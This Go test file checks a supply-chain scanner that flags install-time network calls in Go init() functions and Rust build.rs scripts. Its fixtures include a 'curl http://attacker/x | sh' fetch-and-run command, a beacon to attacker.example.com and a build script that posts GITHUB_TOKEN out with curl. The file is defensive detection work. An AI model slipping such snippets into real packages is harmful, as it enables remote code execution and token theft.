package gate

import (
	"context"
	"testing"
)

func TestGoInit_DetectsNetworkInInit(t *testing.T) {
	goCode := `package x

import (
	"net/http"
	"fmt"
)

func init() {
	resp, _ := http.Get("http://attacker.example.com/beacon")
	fmt.Println(resp)
}
`
	tarball := buildTarball(t, map[string]string{
		"go.mod": "module foo\n",
		"foo.go": goCode,
	})
	s := &StaticScan{
		Probes:   probesWith("go", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "go", Name: "foo", Version: "1.0.0"})
	if r.Verdict == VerdictApprove {
		t.Errorf("init() + http.Get should not Approve, got %v\n%s", r.Verdict, r.Detail)
	}
	if !contains(r.Detail, "go-init-with-network") {
		t.Errorf("detail should call out go-init-with-network, got %q", r.Detail)
	}
}

func TestGoInit_BlocksOnInitWithExec(t *testing.T) {
	goCode := `package x

import "os/exec"

func init() {
	exec.Command("/bin/sh", "-c", "curl http://attacker/x | sh").Run()
}
`
	tarball := buildTarball(t, map[string]string{
		"go.mod": "module foo\n",
		"foo.go": goCode,
	})
	s := &StaticScan{
		Probes:   probesWith("go", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "go", Name: "foo", Version: "1.0.0"})
	if r.Verdict != VerdictBlock {
		t.Errorf("init() + exec.Command should Block, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestGoInit_ApprovesPlainInit(t *testing.T) {
	// init() that just sets a package-level variable is fine.
	goCode := `package x

var defaultClient = newClient()

func init() {
	defaultClient.SetTimeout(30)
}
func newClient() *Client { return &Client{} }

type Client struct{}
func (c *Client) SetTimeout(int) {}
`
	tarball := buildTarball(t, map[string]string{
		"go.mod": "module foo\n",
		"foo.go": goCode,
	})
	s := &StaticScan{
		Probes:   probesWith("go", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "go", Name: "foo", Version: "1.0.0"})
	if r.Verdict != VerdictApprove {
		t.Errorf("benign init() should Approve, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestGoInit_IgnoresTestFiles(t *testing.T) {
	// Test files legitimately do network etc. for fixtures.
	goCode := `package x

import "net/http"

func init() {
	http.Get("http://test-server/setup")
}
`
	tarball := buildTarball(t, map[string]string{
		"go.mod":      "module foo\n",
		"foo_test.go": goCode,
	})
	s := &StaticScan{
		Probes:   probesWith("go", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "go", Name: "foo", Version: "1.0.0"})
	if r.Verdict != VerdictApprove {
		t.Errorf("init() in *_test.go should be ignored, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestRustBuildRs_DetectsHTTPCall(t *testing.T) {
	buildRs := `use reqwest;

fn main() {
	let body = reqwest::blocking::get("http://attacker.example.com/").unwrap().text().unwrap();
	std::fs::write("/tmp/exfil", body).unwrap();
}
`
	tarball := buildTarball(t, map[string]string{
		"Cargo.toml": `[package]\nname = "evil"\nversion = "0.1.0"\n`,
		"build.rs":   buildRs,
	})
	s := &StaticScan{
		Probes:   probesWith("crates", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "crates", Name: "evil", Version: "0.1.0"})
	if r.Verdict != VerdictBlock {
		t.Errorf("build.rs with reqwest should Block, got %v\n%s", r.Verdict, r.Detail)
	}
	if !contains(r.Detail, "rust-build-rs-network") {
		t.Errorf("detail should call out network, got %q", r.Detail)
	}
}

func TestRustBuildRs_DetectsSecretEnvRead(t *testing.T) {
	buildRs := `fn main() {
	let token = std::env::var("GITHUB_TOKEN").unwrap();
	let _ = std::process::Command::new("curl")
	    .arg("-d").arg(token)
	    .arg("http://example.com/")
	    .status();
}
`
	tarball := buildTarball(t, map[string]string{
		"build.rs": buildRs,
	})
	s := &StaticScan{
		Probes:   probesWith("crates", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "crates", Name: "e", Version: "0.1"})
	if r.Verdict != VerdictBlock {
		t.Errorf("build.rs reading GITHUB_TOKEN + curl should Block, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestRustBuildRs_ApprovesLegitimateBuild(t *testing.T) {
	// Lots of legit crates have build.rs that does codegen.
	buildRs := `fn main() {
	println!("cargo:rerun-if-changed=build.rs");
	println!("cargo:rustc-link-lib=z");
	let out_dir = std::env::var("OUT_DIR").unwrap();
	std::fs::write(format!("{}/version.rs", out_dir), "pub const V: &str = \"1.0\";").unwrap();
}
`
	tarball := buildTarball(t, map[string]string{
		"build.rs": buildRs,
	})
	s := &StaticScan{
		Probes:   probesWith("crates", stubProbe{tarballURL: "x", tarballContents: tarball}),
		MaxBytes: 1 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "crates", Name: "legit", Version: "0.1"})
	if r.Verdict != VerdictApprove {
		t.Errorf("legitimate codegen build.rs should Approve, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestIsGoSource(t *testing.T) {
	cases := map[string]bool{
		"foo.go":           true,
		"sub/foo.go":       true,
		"foo_test.go":      false,
		"sub/foo_test.go":  false,
		"foo.rs":           false,
		"foo.go.bak":       false,
	}
	for path, want := range cases {
		if got := isGoSource(path); got != want {
			t.Errorf("isGoSource(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestIsRustBuildScript(t *testing.T) {
	cases := map[string]bool{
		"build.rs":         true,
		"crate/build.rs":   true,
		"src/main.rs":      false,
		"build.rs.bak":     false,
	}
	for path, want := range cases {
		if got := isRustBuildScript(path); got != want {
			t.Errorf("isRustBuildScript(%q) = %v, want %v", path, got, want)
		}
	}
}
